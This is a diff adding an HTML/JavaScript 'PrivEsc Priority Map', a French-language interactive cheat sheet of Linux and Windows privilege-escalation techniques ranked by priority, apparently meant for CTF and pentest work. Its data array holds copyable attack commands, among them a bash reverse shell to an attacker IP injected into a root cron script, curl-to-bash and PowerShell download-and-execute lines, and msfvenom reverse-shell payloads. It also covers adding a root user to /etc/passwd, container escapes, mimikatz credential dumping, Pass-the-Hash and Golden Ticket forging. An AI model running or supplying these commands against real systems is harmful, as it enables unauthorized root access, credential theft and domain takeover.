@@ -1,0 +1,733 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>PrivEsc Priority Map</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700;800&display=swap');
+* { margin:0; padding:0; box-sizing:border-box; }
+:root {
+  --bg:#060a0e; --surface:#0c1218; --border:#1c2633;
+  --p1:#ff4d6d; --p2:#ff8c42; --p3:#ffd166; --p4:#06d6a0; --p5:#4ecdc4;
+  --linux:#39d353; --win:#7b61ff;
+}
+body { background:var(--bg); font-family:'JetBrains Mono',monospace; overflow:hidden; height:100vh; width:100vw; cursor:grab; }
+body.dragging { cursor:grabbing; }
+
+/* ── TOOLBAR ── */
+#toolbar {
+  position:fixed; top:12px; left:50%; transform:translateX(-50%);
+  z-index:300; display:flex; gap:5px; align-items:center;
+  background:rgba(6,10,14,0.97); border:1px solid var(--border);
+  border-radius:10px; padding:7px 14px;
+  box-shadow:0 4px 40px rgba(0,0,0,0.7);
+}
+.logo { font-size:11px; font-weight:800; letter-spacing:3px; color:var(--p1); margin-right:6px; }
+.tb { background:#0e1620; border:1px solid #1e2e40; color:#607080;
+      padding:5px 11px; border-radius:6px; cursor:pointer;
+      font-family:inherit; font-size:11px; transition:all .15s; }
+.tb:hover { background:#182535; color:#ccc; border-color:#3a5060; }
+.tb.al { background:#0a1825; color:#38bdf8; border-color:#38bdf8; }
+.tb.ll { background:#071510; color:var(--linux); border-color:var(--linux); }
+.tb.wl { background:#0d0b22; color:var(--win); border-color:var(--win); }
+.sep { width:1px; height:18px; background:#1c2633; margin:0 3px; }
+
+/* ── LEGEND ── */
+#legend {
+  position:fixed; top:62px; right:14px; z-index:300;
+  background:rgba(6,10,14,0.96); border:1px solid var(--border);
+  border-radius:10px; padding:12px 14px; font-size:10px;
+  box-shadow:0 4px 20px rgba(0,0,0,.5);
+}
+#legend h4 { color:#2a3a4a; font-size:9px; letter-spacing:2px; text-transform:uppercase; margin-bottom:9px; }
+.lrow { display:flex; align-items:center; gap:7px; margin:4px 0; }
+.lbadge { width:18px; height:18px; border-radius:50%; display:flex; align-items:center; justify-content:center; font-size:9px; font-weight:800; }
+
+/* ── SCAN ── */
+#scan { position:fixed; inset:0; pointer-events:none; z-index:999;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,.02) 2px,rgba(0,0,0,.02) 4px); }
+#hint { position:fixed; bottom:12px; left:14px; z-index:200; font-size:10px; color:#1e2e3e; letter-spacing:1px; line-height:1.9; }
+
+/* ── UNIVERSE ── */
+#universe { position:absolute; top:0; left:0; transform-origin:0 0; }
+svg#edges { position:absolute; top:0; left:0; overflow:visible; pointer-events:none; }
+
+/* ── NODES ── */
+.node {
+  position:absolute; border-radius:9px; border:1.5px solid;
+  cursor:pointer; display:flex; align-items:center; gap:7px;
+  transition:transform .15s, box-shadow .2s; z-index:10;
+  font-weight:700; user-select:none; white-space:nowrap;
+  font-family:'JetBrains Mono',monospace;
+}
+.node:hover { transform:scale(1.06) !important; z-index:40; }
+
+.node.root {
+  background:#071220; border-color:#38bdf8; color:#c8eeff;
+  font-size:15px; padding:13px 26px; border-radius:14px;
+  box-shadow:0 0 40px rgba(56,189,248,.2);
+}
+.node.os-head { font-size:13px; font-weight:800; padding:10px 20px; border-radius:12px; }
+.node.os-head.linux { background:#071510; border-color:var(--linux); color:#9ef7b0; box-shadow:0 0 20px rgba(57,211,83,.15); }
+.node.os-head.win   { background:#0c0a1e; border-color:var(--win);   color:#c4b5fd; box-shadow:0 0 20px rgba(123,97,255,.15); }
+
+/* priority group label */
+.node.pgroup { font-size:9px; font-weight:800; padding:4px 10px; border-radius:6px; letter-spacing:1.5px; text-transform:uppercase; cursor:default; }
+.node.pgroup:hover { transform:none !important; }
+
+/* attack node */
+.node.atk { font-size:11px; font-weight:700; padding:8px 13px; }
+.node.atk.linux { background:#071410; }
+.node.atk.win   { background:#0b091e; }
+.node.atk.p1 { border-color:var(--p1); }
+.node.atk.p2 { border-color:var(--p2); }
+.node.atk.p3 { border-color:var(--p3); }
+.node.atk.p4 { border-color:var(--p4); }
+.node.atk.p5 { border-color:var(--p5); }
+.node.atk.p1.linux { color:#ffb3bf; box-shadow:0 0 12px rgba(255,77,109,.2); }
+.node.atk.p2.linux { color:#ffcba0; box-shadow:0 0 10px rgba(255,140,66,.15); }
+.node.atk.p3.linux { color:#ffe9a0; }
+.node.atk.p4.linux { color:#9efae0; }
+.node.atk.p5.linux { color:#b0f0ee; }
+.node.atk.p1.win   { color:#ffb3bf; box-shadow:0 0 12px rgba(255,77,109,.2); }
+.node.atk.p2.win   { color:#ffcba0; box-shadow:0 0 10px rgba(255,140,66,.15); }
+.node.atk.p3.win   { color:#ffe9a0; }
+.node.atk.p4.win   { color:#9efae0; }
+.node.atk.p5.win   { color:#b0f0ee; }
+
+/* detection sub-node */
+.node.det {
+  font-size:9.5px; font-weight:400; padding:6px 10px 6px 12px;
+  border-radius:6px; border-style:dashed;
+  white-space:pre-wrap; word-break:break-all;
+  line-height:1.55; cursor:pointer;
+  display:flex; align-items:flex-start; gap:5px; justify-content:space-between;
+  z-index:8;
+}
+.node.det .det-text { flex:1; min-width:0; }
+.node.det .ci { flex-shrink:0; font-size:11px; opacity:0.3; transition:opacity .15s; }
+.node.det:hover .ci { opacity:1; }
+.node.det.linux { background:#040e06; border-color:#1a3a20; color:#4a9960; }
+.node.det.win   { background:#07051a; border-color:#2a1a5a; color:#7060b0; }
+.node.det:hover { transform:scale(1.03) !important; }
+
+.pbadge {
+  width:17px; height:17px; border-radius:50%; flex-shrink:0;
+  display:flex; align-items:center; justify-content:center;
+  font-size:9px; font-weight:800;
+}
+
+/* ── TOOLTIP ── */
+#tooltip {
+  position:fixed; z-index:500;
+  background:rgba(5,9,15,.98); border:1px solid #1e3040;
+  border-radius:10px; padding:14px 16px;
+  max-width:400px; min-width:260px;
+  font-size:11px; color:#8a9ab0; line-height:1.7;
+  pointer-events:auto; opacity:0; transition:opacity .18s;
+  backdrop-filter:blur(16px); box-shadow:0 8px 40px rgba(0,0,0,.8);
+}
+#tooltip.show { opacity:1; }
+#tooltip .tt-h { display:flex; align-items:center; gap:8px; margin-bottom:8px; }
+#tooltip .tt-title { color:#fff; font-size:13px; font-weight:700; }
+#tooltip .tt-sub { font-size:10px; margin-top:1px; }
+#tooltip .tt-desc { margin-bottom:10px; color:#7a8a9a; font-size:11px; }
+#tooltip .tt-sec { font-size:9px; letter-spacing:2px; color:#2a3a4a; text-transform:uppercase; margin:8px 0 4px; }
+#tooltip .cw { position:relative; margin-bottom:6px; }
+#tooltip .code {
+  background:#080e16; border:1px solid #152030; border-left:3px solid;
+  border-radius:5px; padding:7px 32px 7px 10px; font-size:10px;
+  font-family:'JetBrains Mono',monospace; white-space:pre; overflow-x:auto;
+  line-height:1.6; cursor:pointer;
+}
+#tooltip .code:hover { background:#0d1520; }
+#tooltip .code.linux { color:#39d353; border-left-color:var(--linux); }
+#tooltip .code.win   { color:#9f8fef; border-left-color:var(--win); }
+#tooltip .cpbtn {
+  position:absolute; top:5px; right:6px;
+  background:transparent; border:none; cursor:pointer;
+  font-size:12px; opacity:0.3; transition:opacity .15s; padding:2px 4px; color:inherit;
+}
+#tooltip .cpbtn:hover { opacity:1; }
+#tooltip .tt-why { margin-top:8px; font-size:10px; color:#3a4a5a; border-top:1px solid #101820; padding-top:8px; }
+#tooltip .tt-why span { color:#607080; }
+
+/* ── TOAST ── */
+#toast {
+  position:fixed; bottom:44px; left:50%; transform:translateX(-50%) translateY(16px);
+  z-index:600; background:#0c1e10; border:1px solid var(--linux);
+  color:var(--linux); border-radius:8px; padding:7px 16px;
+  font-size:11px; font-weight:600; letter-spacing:.5px;
+  opacity:0; transition:opacity .2s, transform .2s; pointer-events:none; white-space:nowrap;
+}
+#toast.wt { background:#0d0a22; border-color:var(--win); color:#a78bfa; }
+#toast.show { opacity:1; transform:translateX(-50%) translateY(0); }
+</style>
+</head>
+<body>
+<div id="scan"></div>
+
+<div id="toolbar">
+  <span class="logo">PRIVESC</span>
+  <div class="sep"></div>
+  <button class="tb al" id="btn-all"   onclick="setFilter('all')">⬡ ALL</button>
+  <button class="tb"    id="btn-linux" onclick="setFilter('linux')">🐧 LINUX</button>
+  <button class="tb"    id="btn-win"   onclick="setFilter('win')">🪟 WINDOWS</button>
+  <div class="sep"></div>
+  <button class="tb" onclick="resetView()">↺ RESET</button>
+  <button class="tb" onclick="zoomBy(1.15)">＋</button>
+  <button class="tb" onclick="zoomBy(0.87)">－</button>
+</div>
+
+<div id="legend">
+  <h4>Fréquence</h4>
+  <div class="lrow"><div class="lbadge" style="background:rgba(255,77,109,.2);color:#ff4d6d;border:1px solid #ff4d6d55">1</div><span style="color:#ff4d6d">Immédiat</span></div>
+  <div class="lrow"><div class="lbadge" style="background:rgba(255,140,66,.2);color:#ff8c42;border:1px solid #ff8c4255">2</div><span style="color:#ff8c42">Très fréquent</span></div>
+  <div class="lrow"><div class="lbadge" style="background:rgba(255,209,102,.2);color:#ffd166;border:1px solid #ffd16655">3</div><span style="color:#ffd166">Fréquent</span></div>
+  <div class="lrow"><div class="lbadge" style="background:rgba(6,214,160,.15);color:#06d6a0;border:1px solid #06d6a055">4</div><span style="color:#06d6a0">Situationnel</span></div>
+  <div class="lrow"><div class="lbadge" style="background:rgba(78,205,196,.15);color:#4ecdc4;border:1px solid #4ecdc455">5</div><span style="color:#4ecdc4">Avancé / Rare</span></div>
+  <div style="border-top:1px solid #1a2535;margin:8px 0 6px"></div>
+  <div class="lrow"><div style="width:7px;height:7px;border-radius:50%;background:#39d353"></div><span style="color:#39d35388">Linux</span></div>
+  <div class="lrow"><div style="width:7px;height:7px;border-radius:50%;background:#7b61ff"></div><span style="color:#7b61ff88">Windows</span></div>
+  <div class="lrow" style="margin-top:5px">
+    <div style="width:20px;height:1px;background:repeating-linear-gradient(90deg,#446,transparent 4px,transparent 6px)"></div>
+    <span style="color:#2a3444">Cmd détection</span>
+  </div>
+</div>
+
+<div id="hint">drag · scroll = zoom · clic nœud = détails + exploit<br>clic cmd (pointillés ou popup) = 📋 copier</div>
+
+<div id="universe">
+  <svg id="edges" width="10000" height="5000"></svg>
+</div>
+<div id="tooltip"></div>
+<div id="toast">📋 Copié !</div>
+
+<script>
+// ═══════════════════════════════════════════════════════════════════
+// DATA
+// ═══════════════════════════════════════════════════════════════════
+const PC = {1:'#ff4d6d',2:'#ff8c42',3:'#ffd166',4:'#06d6a0',5:'#4ecdc4'};
+const PL = ['','Critique','Très fréquent','Fréquent','Situationnel','Avancé'];
+
+const ATTACKS = [
+  // ── LINUX ─────────────────────────────────────────────────────────
+  { id:'l1', os:'linux', prio:1, label:'Sudo Misconfig',
+    desc:'Premier réflexe. NOPASSWD sur un binaire GTFOBins = root immédiat. Révèle aussi env_keep, LD_PRELOAD.',
+    why:'Présent dans ~60% des CTF et nombreux environnements réels.',
+    detect:['sudo -l'],
+    exploit:'# NOPASSWD vim :\nsudo vim -c \'!bash\'\n# NOPASSWD find :\nsudo find . -exec /bin/bash \\;\n# NOPASSWD python :\nsudo python3 -c "import pty; pty.spawn(\'/bin/bash\')"' },
+
+  { id:'l2', os:'linux', prio:1, label:'SUID Binaries',
+    desc:'Binaires setuid root exécutés avec les droits root. GTFOBins recense les exploits pour chaque binaire.',
+    why:'Quasi-systématique. find, vim, python SUID = root trivial.',
+    detect:['find / -perm -4000 -type f 2>/dev/null','find / -perm -u=s -type f 2>/dev/null'],
+    exploit:'# find SUID :\n/usr/bin/find . -exec /bin/sh -p \\;\n# bash SUID :\n/bin/bash -p\n# python3 :\npython3 -c "import os; os.setuid(0); os.execl(\'/bin/sh\',\'sh\')"' },
+
+  { id:'l3', os:'linux', prio:1, label:'Writable /etc/passwd',
+    desc:'Ajouter un utilisateur uid=0. Rare en prod, très fréquent en CTF.',
+    why:'Vecteur immédiat si présent.',
+    detect:['ls -la /etc/passwd /etc/shadow','stat /etc/passwd | grep -i write'],
+    exploit:'openssl passwd -1 "haxpass"\necho "hax:\\$1\\$...:0:0::/root:/bin/bash" >> /etc/passwd\nsu hax' },
+
+  { id:'l4', os:'linux', prio:2, label:'Cron Jobs',
+    desc:'Scripts périodiques root dont le fichier ou répertoire parent est writable.',
+    why:'Très fréquent. pspy révèle des crons invisibles.',
+    detect:['cat /etc/crontab && ls /etc/cron*','./pspy64  # monitor processes','find / -writable -name "*.sh" 2>/dev/null'],
+    exploit:'echo "chmod +s /bin/bash" >> /opt/backup.sh\n# Ou reverse shell :\necho "bash -i >& /dev/tcp/IP/9001 0>&1" >> /opt/script.sh' },
+
+  { id:'l5', os:'linux', prio:2, label:'Credentials fichiers',
+    desc:'Mots de passe dans .bash_history, .env, configs applicatives, variables d\'env.',
+    why:'Négligé par les admins. Trouvé en quelques secondes.',
+    detect:['cat ~/.bash_history','env | grep -iE "pass|secret|key|token"','find / -name ".env" 2>/dev/null | xargs cat'],
+    exploit:'su <user>\nssh user@localhost\nsudo -s  # réutilisation' },
+
+  { id:'l6', os:'linux', prio:2, label:'LinPEAS / LinEnum',
+    desc:'Automatise l\'énumération complète : SUID, sudo, capabilities, crons, NFS, passwords...',
+    why:'À lancer dès le premier shell. Révèle tout ce qu\'on oublierait manuellement.',
+    detect:['python3 -m http.server 8000  # Kali','curl http://IP:8000/linpeas.sh | bash','wget -qO- http://IP:8000/linenum.sh | bash'],
+    exploit:'./linpeas.sh 2>/dev/null | tee /tmp/lp.txt\n# Rouge/Jaune = critique, Cyan = intéressant' },
+
+  { id:'l7', os:'linux', prio:3, label:'PATH Hijacking',
+    desc:'Script root appelle un binaire sans chemin absolu. Créer un faux binaire dans un dossier writable du PATH.',
+    why:'Fréquent avec scripts custom mal écrits.',
+    detect:['echo $PATH','find / -writable -type d 2>/dev/null | grep -v proc','strings /usr/local/bin/* 2>/dev/null | grep -v "/"'],
+    exploit:'echo "/bin/bash -p" > /tmp/service\nchmod +x /tmp/service\nexport PATH=/tmp:$PATH' },
+
+  { id:'l8', os:'linux', prio:3, label:'Capabilities',
+    desc:'cap_setuid sur python/ruby/node = root trivial. cap_dac_override contourne les permissions fichiers.',
+    why:'Souvent mis en place pour éviter le SUID complet, tout aussi dangereux.',
+    detect:['getcap -r / 2>/dev/null','/sbin/getcap -r / 2>/dev/null | grep -v "^$"'],
+    exploit:'python3 -c "import os; os.setuid(0); os.system(\'/bin/bash\')"\nperl -e \'use POSIX; setuid(0); exec "/bin/bash";\'' },
+
+  { id:'l9', os:'linux', prio:3, label:'NFS no_root_squash',
+    desc:'Share NFS sans root squashing : monter depuis attaquant (root) et créer un SUID.',
+    why:'Fréquent dans les configs NFS legacy.',
+    detect:['cat /etc/exports','showmount -e localhost','showmount -e <target_ip>'],
+    exploit:'# Attaquant (root) :\nmount -t nfs <target>:/share /mnt/nfs\ncp /bin/bash /mnt/nfs/ && chmod +s /mnt/nfs/bash\n# Cible :\n/tmp/nfs/bash -p' },
+
+  { id:'l10', os:'linux', prio:4, label:'LD_PRELOAD via sudo',
+    desc:'Si env_keep+=LD_PRELOAD dans sudoers, charger une .so malveillante.',
+    why:'Rare mais trivial si présent.',
+    detect:['sudo -l | grep -i ld_preload','sudo -l | grep env_keep'],
+    exploit:'// evil.c : void _init() { setuid(0); system("/bin/bash"); }\ngcc -shared -o /tmp/evil.so -fPIC evil.c\nsudo LD_PRELOAD=/tmp/evil.so find .' },
+
+  { id:'l11', os:'linux', prio:4, label:'Container Escape',
+    desc:'Docker socket RW, --privileged ou cgroup release_agent pour sortir vers l\'hôte.',
+    why:'De plus en plus fréquent en contexte cloud/DevOps.',
+    detect:['ls -la /var/run/docker.sock','cat /proc/1/cgroup | head -5','capsh --print | grep cap_sys_admin'],
+    exploit:'# Docker socket :\ndocker run -v /:/mnt --rm -it alpine chroot /mnt sh\n# Privileged :\nmount /dev/sda1 /mnt && chroot /mnt' },
+
+  { id:'l12', os:'linux', prio:5, label:'Kernel Exploits',
+    desc:'DirtyPipe (≥5.8), DirtyCow (2016-5195), OverlayFS. Dernier recours, peut crasher.',
+    why:'Efficace sur kernels non patchés mais risqué. Toujours essayer les autres vecteurs avant.',
+    detect:['uname -a','uname -r && cat /etc/os-release','bash les.sh  # Linux Exploit Suggester'],
+    exploit:'# DirtyPipe (CVE-2022-0847) :\ngcc dirty_pipe.c -o dp && ./dp /etc/passwd\n# DirtyCow :\ngcc -pthread dirty.c -o dirty -lcrypt && ./dirty' },
+
+  { id:'l13', os:'linux', prio:5, label:'Shared Object Hijack',
+    desc:'Injecter une .so dans le chemin de chargement d\'un binaire SUID.',
+    why:'Technique avancée, nécessite analyse des dépendances.',
+    detect:['ldd /usr/local/bin/suid_binary','strace /bin/suid_bin 2>&1 | grep "No such file"','readelf -d /usr/local/bin/suid_bin | grep RPATH'],
+    exploit:'gcc -shared -o /tmp/libmissing.so -fPIC exploit.c\n# Placer dans le RPATH ou LD_LIBRARY_PATH' },
+
+  // ── WINDOWS ───────────────────────────────────────────────────────
+  { id:'w1', os:'win', prio:1, label:'SeImpersonate (Potatoes)',
+    desc:'SeImpersonatePrivilege sur IIS/MSSQL = PrintSpoofer, GodPotato, JuicyPotato → SYSTEM.',
+    why:'Présent par défaut sur les comptes de service Windows.',
+    detect:['whoami /priv','whoami /priv | findstr /i "impersonate"'],
+    exploit:'.\\PrintSpoofer.exe -i -c cmd\n.\\GodPotato.exe -cmd "cmd /c whoami"\n.\\JuicyPotato.exe -l 1337 -p cmd.exe -t *' },
+
+  { id:'w2', os:'win', prio:1, label:'WinPEAS / PowerUp',
+    desc:'Automatise l\'énumération complète des vecteurs Windows.',
+    why:'À lancer immédiatement. Révèle tout ce qui est exploitable.',
+    detect:['certutil -urlcache -split -f http://IP/winpeas.exe wp.exe && .\\wp.exe','IEX(New-Object Net.WebClient).DownloadString("http://IP/PowerUp.ps1"); Invoke-AllChecks'],
+    exploit:'# WinPEAS : rouge = critique, jaune = intéressant\n# PowerUp :\nInvoke-AllChecks | Out-File C:\\results.txt' },
+
+  { id:'w3', os:'win', prio:1, label:'Unquoted Service Path',
+    desc:'Chemin de service non quoté avec espace. Windows cherche C:\\Program.exe avant le vrai binaire.',
+    why:'Très fréquent avec les logiciels tiers sur anciens Windows.',
+    detect:['wmic service get name,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\\windows"','sc qc <ServiceName>'],
+    exploit:'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=9001 -f exe > "C:\\Program.exe"\nsc stop MyApp && sc start MyApp' },
+
+  { id:'w4', os:'win', prio:3, label:'Stored Credentials',
+    desc:'cmdkey, Credential Manager, registry, scripts PS avec mots de passe en clair.',
+    why:'Très courant en entreprise.',
+    detect:['cmdkey /list','reg query HKLM /f password /t REG_SZ /s','reg query "HKCU\\Software\\SimonTatham\\PuTTY\\Sessions" /s'],
+    exploit:'runas /savecred /user:DOMAIN\\admin "cmd /c ..."\nnet use \\\\server\\share /user:admin MotDePasse' },
+
+  { id:'w5', os:'win', prio:3, label:'Writable Service Binary',
+    desc:'Remplacer le binaire d\'un service dont les ACLs autorisent l\'écriture.',
+    why:'Fréquent avec les logiciels tiers mal packagés.',
+    detect:['icacls "C:\\Program Files\\VulnApp\\service.exe"','accesschk.exe -uwc "Everyone" *'],
+    exploit:'copy evil.exe "C:\\Program Files\\VulnApp\\service.exe"\nsc stop VulnService && sc start VulnService' },
+
+  { id:'w6', os:'win', prio:3, label:'AlwaysInstallElevated',
+    desc:'Si les deux clés registry sont à 1, tout MSI s\'installe en SYSTEM.',
+    why:'Fréquent sur machines mal configurées par GPO.',
+    detect:['reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated','reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated'],
+    exploit:'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=9001 -f msi > evil.msi\nmsiexec /quiet /qn /i evil.msi' },
+
+  { id:'w7', os:'win', prio:4, label:'UAC Bypass',
+    desc:'fodhelper, eventvwr, CMSTP : passer de medium à high integrity sans prompt.',
+    why:'Nécessaire quand on a un compte admin local mais pas encore élevé.',
+    detect:['whoami /groups | findstr /i "medium high"','reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin'],
+    exploit:'# fodhelper bypass :\nNew-Item -Path HKCU:\\Software\\Classes\\ms-settings\\shell\\open\\command -Force\nSet-ItemProperty ... -Name "(default)" -Value "cmd /c start cmd.exe"\nStart-Process fodhelper.exe' },
+
+  { id:'w8', os:'win', prio:4, label:'DLL Hijacking',
+    desc:'Process qui cherche une DLL manquante dans un dossier writable avant System32.',
+    why:'Fréquent dans les logiciels tiers. Procmon indispensable.',
+    detect:['Get-Process | where {$_.Path -like "C:\\Program Files*"}','# procmon : Result = NAME NOT FOUND AND .dll'],
+    exploit:'msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=9001 -f dll > vuln.dll\n# Placer dans le dossier writable identifié' },
+
+  { id:'w9', os:'win', prio:4, label:'Scheduled Tasks',
+    desc:'Tâches planifiées SYSTEM dont le binaire ou script est writable.',
+    why:'Souvent oublié dans les audits.',
+    detect:['schtasks /query /fo LIST /v | findstr /i "task to run"','Get-ScheduledTask | where {$_.Principal.UserId -like "*SYSTEM*"}'],
+    exploit:'copy evil.exe "C:\\path\\to\\task.exe"\nschtasks /run /tn "VulnTask"' },
+
+  { id:'w10', os:'win', prio:2, label:'Kerberoasting (AD)',
+    desc:'Demander des TGS pour comptes avec SPN, cracker offline avec hashcat.',
+    why:'Présent dans tout env AD. Comptes de service souvent avec mdp faibles.',
+    detect:['setspn -T domain.local -Q */*','Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName'],
+    exploit:'Rubeus.exe kerberoast /outfile:hashes.txt\nGetUserSPNs.py domain.local/user:pass -dc-ip DC_IP -request\nhashcat -m 13100 hashes.txt rockyou.txt' },
+
+  { id:'w11', os:'win', prio:2, label:'Pass-the-Hash',
+    desc:'Utiliser un hash NTLM dumped pour s\'authentifier sans le mot de passe en clair.',
+    why:'Fondamental en post-exploitation AD.',
+    detect:['privilege::debug\nsekurlsa::logonpasswords  # mimikatz','secretsdump.py local -sam SAM -system SYSTEM'],
+    exploit:'evil-winrm -i <target> -u Administrator -H <ntlm_hash>\npsexec.py domain/Admin@target -hashes :ntlmhash' },
+
+  { id:'w12', os:'win', prio:5, label:'DCSync / Golden Ticket',
+    desc:'DS-Replication = dump de tous les hashes. krbtgt = Golden Ticket, persistance totale.',
+    why:'Fin de partie en AD. Nécessite déjà des droits élevés.',
+    detect:['Get-ObjectAcl -ResolveGUIDs | where {$_.ActiveDirectoryRights -like "*Replication*"}','BloodHound: "Find Principals with DCSync Rights"'],
+    exploit:'lsadump::dcsync /domain:corp.local /user:krbtgt\nkerberos::golden /user:admin /domain:corp.local /sid:<SID> /krbtgt:<hash>\nkerberos::ptt ticket.kirbi' },
+
+  { id:'w13', os:'win', prio:1, label:'BloodHound / ACL Paths',
+    desc:'Cartographier les chemins d\'escalade AD via groupes, ACLs, GPO, délégations.',
+    why:'Indispensable sur les gros domaines.',
+    detect:['SharpHound.exe -c All --zipfilename out.zip','bloodhound-python -u user -p pass -d domain.local -c all'],
+    exploit:'# Importer dans BloodHound GUI\n# "Shortest Paths to Domain Admins"\n# "Find AS-REP Roastable Users"\n# "Find Principals with DCSync Rights"' },
+];
+
+// ═══════════════════════════════════════════════════════════════════
+// LAYOUT CONSTANTS
+// ═══════════════════════════════════════════════════════════════════
+const COLS        = 4;
+const ATK_W       = 240;       // wider attack nodes
+const ATK_H       = 38;
+const DET_W       = 250;       // wider det nodes so text fits
+const COL_GAP     = 60;        // more horizontal breathing room
+const ROW_GAP     = 44;        // more space between priority groups
+const DET_GAP     = 8;         // more space between det nodes
+const DET_TOP_GAP = 12;
+const ROOT_W = 280, ROOT_H = 50;
+const OS_W   = 150, OS_H  = 44;
+
+const L_ATTACKS = ATTACKS.filter(a => a.os === 'linux').sort((a,b) => a.prio - b.prio);
+const W_ATTACKS = ATTACKS.filter(a => a.os === 'win').sort((a,b) => a.prio - b.prio);
+
+const L_ORIGIN_X  = 160;
+const L_WIDTH     = COLS * (ATK_W + COL_GAP);
+const W_ORIGIN_X  = L_ORIGIN_X + L_WIDTH + 200;
+const OS_HEAD_Y   = 100 + ROOT_H + 40;
+const ATK_START_Y = OS_HEAD_Y + OS_H + 44;
+const ORIGIN_Y    = 100;
+
+const L_HEAD_X = L_ORIGIN_X + (L_WIDTH - OS_W) / 2 - COL_GAP/2;
+const W_HEAD_X = W_ORIGIN_X + (COLS * (ATK_W + COL_GAP) - OS_W) / 2 - COL_GAP/2;
+const ROOT_X   = (L_HEAD_X + OS_W/2 + W_HEAD_X + OS_W/2) / 2 - ROOT_W / 2;
+const ROOT_Y   = ORIGIN_Y;
+
+// Pre-assign X only — Y will be recalculated after DOM render
+function preLayoutX(attacks, originX) {
+  const groups = {};
+  attacks.forEach(a => { (groups[a.prio] = groups[a.prio]||[]).push(a); });
+  Object.keys(groups).forEach(p => {
+    groups[p].forEach((a, ci) => { a._x = originX + ci * (ATK_W + COL_GAP); });
+  });
+}
+preLayoutX(L_ATTACKS, L_ORIGIN_X);
+preLayoutX(W_ATTACKS, W_ORIGIN_X);
+
+// ═══════════════════════════════════════════════════════════════════
+// RENDER
+// ═══════════════════════════════════════════════════════════════════
+const universe = document.getElementById('universe');
+const svg = document.getElementById('edges');
+let nodeEls = {};
+let filter = 'all';
+let panX = 0, panY = 0, scale = 1;
+let isPanning = false, lx = 0, ly = 0;
+
+function build() {
+  // Root
+  const rEl = mkEl('div', 'node root');
+  rEl.style.left = ROOT_X + 'px'; rEl.style.top = ROOT_Y + 'px';
+  rEl.style.width = ROOT_W + 'px'; rEl.style.justifyContent = 'center';
+  rEl.textContent = '🔐 Privilege Escalation';
+  rEl.dataset.os = 'both'; rEl.dataset.id = 'root';
+  universe.appendChild(rEl); nodeEls['root'] = rEl;
+
+  // OS heads
+  mkOSHead('lhead', 'linux', '🐧 LINUX',  L_HEAD_X, OS_HEAD_Y);
+  mkOSHead('whead', 'win',   '🪟 WINDOWS', W_HEAD_X, OS_HEAD_Y);
+
+  // Attack + detection nodes — X set, Y is placeholder (ATK_START_Y)
+  ATTACKS.forEach(a => {
+    const col = PC[a.prio];
+    const el = document.createElement('div');
+    el.className = `node atk ${a.os} p${a.prio}`;
+    el.dataset.id = a.id; el.dataset.os = a.os;
+    el.style.left = a._x + 'px'; el.style.top = ATK_START_Y + 'px';
+    el.style.width = ATK_W + 'px';
+    const b = document.createElement('div');
+    b.className = 'pbadge';
+    b.style.cssText = `background:${col}22;color:${col};border:1px solid ${col}55`;
+    b.textContent = a.prio;
+    el.appendChild(b);
+    el.appendChild(document.createTextNode(a.label));
+    el.addEventListener('click', e => { e.stopPropagation(); showTip(a, e); });
+    universe.appendChild(el); nodeEls[a.id] = el;
+
+    // Detection sub-nodes
+    a.detect.forEach((cmd, di) => {
+      const d = document.createElement('div');
+      d.className = `node det ${a.os}`;
+      d.dataset.id = `${a.id}_d${di}`; d.dataset.os = a.os; d.dataset.cmd = cmd;
+      d.style.left = a._x + 'px'; d.style.top = ATK_START_Y + 'px';
+      d.style.width = DET_W + 'px';
+      const txt = document.createElement('span'); txt.className = 'det-text'; txt.textContent = cmd;
+      const ci  = document.createElement('span'); ci.className = 'ci'; ci.textContent = '⎘';
+      d.appendChild(txt); d.appendChild(ci);
+      d.addEventListener('click', e => { e.stopPropagation(); copyText(cmd, a.os, d); });
+      universe.appendChild(d); nodeEls[`${a.id}_d${di}`] = d;
+    });
+  });
+
+  // After DOM is painted, measure real heights and reposition
+  requestAnimationFrame(() => requestAnimationFrame(() => {
+    reflow(L_ATTACKS, L_ORIGIN_X);
+    reflow(W_ATTACKS, W_ORIGIN_X);
+    drawEdges();
+  }));
+}
+
+// Reflow: measure actual DOM heights, assign correct Y positions
+function reflow(attacks, originX) {
+  const groups = {};
+  attacks.forEach(a => { (groups[a.prio] = groups[a.prio]||[]).push(a); });
+  const prios = Object.keys(groups).map(Number).sort((a,b)=>a-b);
+
+  let curY = ATK_START_Y;
+
+  prios.forEach(p => {
+    const row = groups[p];
+
+    // Compute max cell height for this priority row (using real DOM heights)
+    const cellHeights = row.map(atk => {
+      const atkEl = nodeEls[atk.id];
+      const atkH = atkEl ? atkEl.offsetHeight : ATK_H;
+      let total = atkH + DET_TOP_GAP;
+      atk.detect.forEach((cmd, di) => {
+        const dEl = nodeEls[`${atk.id}_d${di}`];
+        total += (dEl ? dEl.offsetHeight : 30) + DET_GAP;
+      });
+      total -= DET_GAP; // no trailing gap
+      return total;
+    });
+    const maxCellH = Math.max(...cellHeights);
+
+    row.forEach((atk, ci) => {
+      const atkEl = nodeEls[atk.id];
+      const atkH  = atkEl ? atkEl.offsetHeight : ATK_H;
+
+      // Position attack node
+      atk._y = curY;
+      if (atkEl) { atkEl.style.top = curY + 'px'; atkEl.style.left = atk._x + 'px'; }
+
+      // Position detection nodes
+      let dy = curY + atkH + DET_TOP_GAP;
+      atk.detect.forEach((cmd, di) => {
+        const dEl = nodeEls[`${atk.id}_d${di}`];
+        atk[`_det_x_${di}`] = atk._x;
+        atk[`_det_y_${di}`] = dy;
+        if (dEl) { dEl.style.left = atk._x + 'px'; dEl.style.top = dy + 'px'; }
+        dy += (dEl ? dEl.offsetHeight : 30) + DET_GAP;
+      });
+    });
+
+    curY += maxCellH + ROW_GAP;
+  });
+}
+
